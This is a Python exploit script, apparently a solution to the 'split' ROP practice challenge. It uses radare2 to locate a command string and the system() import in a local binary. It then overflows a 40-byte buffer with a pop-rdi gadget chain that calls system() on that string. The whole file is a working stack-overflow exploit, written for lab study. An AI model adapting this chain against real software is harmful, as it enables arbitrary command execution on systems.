import r2pipe
from pwn import *

r2 = r2pipe.open('./split')
r2.cmd('aaa')
l = r2.cmd('/ cat').strip().splitlines()[-1]
print(l)

def hex2int(s):
    return int(s[2:], 16)

str_addr = hex2int(l.split()[0][2:])
system = hex2int(r2.cmd('is~imp.system').strip().split()[2])
print(f'arg_str: {hex(str_addr)}')
print(f'system: {hex(system)}')

pop_rdi = 0x0000000000400883

payload = b''

payload += p64(pop_rdi)
payload += p64(str_addr)
payload += p64(system)

p = process('./split')
p.sendline(b'a' * 40 + payload)
p.wait()
print(p.recvall().decode())
